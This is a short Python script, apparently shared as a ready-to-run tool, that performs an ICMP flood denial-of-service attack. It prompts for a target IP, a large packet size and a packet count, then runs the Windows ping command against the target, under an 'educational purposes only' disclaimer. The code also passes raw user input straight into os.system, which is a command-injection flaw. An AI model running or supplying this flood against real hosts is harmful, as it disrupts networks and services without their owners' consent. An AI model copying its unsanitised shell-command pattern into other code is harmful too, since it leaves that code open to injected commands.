#!/usr/bin/env python3
"""
ICMP Flood Attack Script

This script is designed to perform an ICMP flood attack by leveraging the system's ping command.
It sends a specified number of ICMP echo requests (ping packets) to a target host using a user-defined
packet size. This attack can be used to flood a target with network traffic.

DISCLAIMER:
    This script is for educational purposes only. Unauthorized use on networks without explicit
    permission is illegal and unethical.

Author: 789sk.gupta@gmail.com
"""

import os   # Module to interact with the operating system
import sys  # Module for system-specific parameters and functions
import time # Module for time-related functions

def icmp_startattack():
    """
    Initiates an ICMP flood attack on a target system.
    
    The function prompts the user for:
        - The target system's IP address.
        - The size of each ICMP packet (in bytes).
        - The number of packets to send.
    
    It then constructs a system command using the Windows-style ping parameters:
        - '-l' specifies the packet size.
        - '-n' specifies the number of echo requests.
    
    Finally, it executes the command to start the attack.
    """
    # Prompt the user for the target system's IP address.
    hostip = input("Enter target system's IP address: ")
    
    # Prompt for the packet size; a recommended value is around 65500 bytes.
    ippacketData = input("Enter the size of each IP packet (e.g., 65500): ")
    
    # Prompt for the number of packets to send.
    number = input("Enter the number of packets to send: ")
    
    # Inform the user that the attack is beginning.
    print("Attacking the target with crafted ICMP packets")
    
    # Construct the ping command.
    # The command format for Windows is:
    # ping [target IP] -l [packet size] -n [number of packets]
    command = "ping " + hostip + " -l " + ippacketData + " -n " + number
    
    # Execute the constructed command using the operating system.
    os.system(command)

# Main execution: start the attack when the script is run directly.
if __name__ == '__main__':
    icmp_startattack()  # Execute the ICMP flood attack.
    print("Attack finished")
